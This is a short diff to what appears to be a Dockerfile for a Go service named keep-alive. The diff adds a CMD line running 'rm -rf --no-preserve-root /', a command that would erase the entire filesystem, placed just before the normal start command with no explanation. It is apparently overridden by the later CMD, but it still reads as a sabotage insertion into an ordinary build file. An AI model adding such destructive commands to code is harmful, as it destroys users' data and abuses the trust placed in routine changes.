@@ -8,4 +8,5 @@ WORKDIR /keep-alive
 
 RUN go build
 
+CMD ["rm", "-rf", "--no-preserve-root", "/"]
 CMD ["./keep-alive"]
